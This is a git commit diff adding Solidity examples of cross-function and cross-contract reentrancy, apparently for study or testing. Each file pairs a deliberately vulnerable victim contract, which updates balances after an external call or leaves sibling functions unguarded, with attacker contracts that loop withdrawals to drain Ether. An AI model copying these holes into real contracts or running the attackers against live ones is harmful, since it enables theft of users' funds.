bf19c3671609e54ac1e9bb91341842f705e6ee93
MeditationDuck <yoshinao@fit.cvut.cz>
2024-03-13 11:07:31 +0100

    :sparkles: add cross-function-reentrancy and cross-contract-reentrancy

--- contracts/cross-contract-reentrancy.sol
+++ contracts/cross-contract-reentrancy.sol
@@ -134,7 +134,7 @@ abstract contract ReentrancyGuard {
 
 
 
-contract Vault is ReentrancyGuard {
+contract cross_contract_reentrancy is ReentrancyGuard {
     ERC20 public immutable ccrt;
 
     constructor(ERC20 _ccrt){
@@ -146,7 +146,7 @@ contract Vault is ReentrancyGuard {
     }
 
 
-    function  withdrawAll() external nonReentrant {
+    function  withdraw() external nonReentrant {
         uint256 balance = ccrt.balanceOf(msg.sender);
         require(balance > 0, "Insufficient balance");
         (bool success, ) = msg.sender.call{value: balance}(""); 
@@ -154,31 +154,53 @@ contract Vault is ReentrancyGuard {
         require(success, "Failed to send Ether"); 
 
         ccrt.burn(msg.sender, ccrt.balanceOf(msg.sender));
-        // ccrt.burn(msg.sender, balance); 
+        //remove_account(msg.sender); // generally it used function call then they use this value.
     }
 }
 
 
 
 contract attack_cross_contract_reentrancy {
-    Vault victim;
+    cross_contract_reentrancy victim;
     ERC20 ccrt;
-    address attacker2;
+    attack2_cross_contract_reentrancy attacker2;
     uint256 amount = 1 ether;
 
-    constructor(Vault _victim, ERC20 _ccrt, address _attacker2) {
-        victim = Vault(_victim);
+    constructor(address _victim, address _ccrt) {
+        victim = cross_contract_reentrancy(_victim);
         ccrt = ERC20(_ccrt);
-        attacker2 = _attacker2;
+       
+    }
+    function setattacker2(address _attacker2) public {
+        attacker2 = attack2_cross_contract_reentrancy(_attacker2);
     }
 
     receive() external payable {
-        ccrt.transfer(attacker2, msg.value);
+        ccrt.transfer(address(attacker2), msg.value);
     }
 
     function attack() public payable {
-        require(msg.value >= amount);
-        victim.withdrawAll();
+        victim.deposit{value: msg.value}();
+        while(address(victim).balance >= amount){
+            victim.withdraw();
+            attacker2.send(msg.value, address(this));
+        }
+            
     }
     
+}
+
+contract attack2_cross_contract_reentrancy {
+    cross_contract_reentrancy victim;
+    ERC20 ccrt;
+    uint256 amount = 1 ether;
+
+    constructor(cross_contract_reentrancy _victim, ERC20 _ccrt) {
+        victim = cross_contract_reentrancy(_victim);
+        ccrt = ERC20(_ccrt);
+    }
+
+    function send(uint256 _amount, address attacker) public {
+        ccrt.transfer(attacker, _amount);
+    }
 }
--- contracts/cross-function-reentrancy.sol
+++ contracts/cross-function-reentrancy.sol
@@ -1,8 +1,55 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract cross_function_reentrancy {
+abstract contract ReentrancyGuard {
+    uint256 private constant NOT_ENTERED = 1;
+    uint256 private constant ENTERED = 2;
+
+    uint256 private _status;
+
+    error ReentrancyGuardReentrantCall();
+
+    constructor() {
+        _status = NOT_ENTERED;
+    }
+
+    modifier nonReentrant() {
+        _nonReentrantBefore();
+        _;
+        _nonReentrantAfter();
+    }
+
+    function _nonReentrantBefore() private {
+        // On the first call to nonReentrant, _status will be NOT_ENTERED
+        if (_status == ENTERED) {
+            revert ReentrancyGuardReentrantCall();
+        }
+
+        // Any calls to nonReentrant after this point will fail
+        _status = ENTERED;
+    }
+
+    function _nonReentrantAfter() private {
+        // By storing the original value once again, a refund is triggered (see
+        // https://eips.ethereum.org/EIPS/eip-2200)
+        _status = NOT_ENTERED;
+    }
+
+    /**
+     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
+     * `nonReentrant` function in the call stack.
+     */
+    function _reentrancyGuardEntered() internal view returns (bool) {
+        return _status == ENTERED;
+    }
+}
+
+contract cross_function_reentrancy is ReentrancyGuard {
     mapping (address => uint) private balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
 
     function transfer(address to, uint amount) public {
         if (balances[msg.sender] >= amount) {
@@ -11,9 +58,53 @@ contract cross_function_reentrancy {
         }
     }
 
-    function withdraw() public { // we can use noReentrant here.
+    function withdraw() public nonReentrant { // we can use noReentrant here.
         uint amount = balances[msg.sender];
         msg.sender.call{value: amount}("");
         balances[msg.sender] = 0;
     }
+}
+
+contract attack_cross_function_reentrancy {
+    cross_function_reentrancy victim;
+    uint256 amount = 1 ether;
+
+    attack2_cross_function_reentrancy public attacker2;
+
+    constructor(cross_function_reentrancy _victim) {
+        victim = cross_function_reentrancy(_victim);
+    }
+
+    function setattacker2(address _attacker2) public {
+        attacker2 = attack2_cross_function_reentrancy(_attacker2);
+    }
+
+    function attack() public payable {
+        victim.deposit{value: msg.value}();
+        while(address(victim).balance >= amount) {
+            victim.withdraw();
+            attacker2.send(msg.value, address(this));
+        }
+    }
+
+    receive() external payable {
+        victim.transfer(address(attacker2), msg.value);
+    }
+}
+
+
+contract attack2_cross_function_reentrancy {
+
+ 
+    uint256 amount = 1 ether;
+    cross_function_reentrancy victim;
+
+    constructor(cross_function_reentrancy _victim) {
+        victim = cross_function_reentrancy(_victim);
+    }
+
+    function send(uint256 value, address attacker) public {
+        victim.transfer(attacker, value);
+    }
+
 }
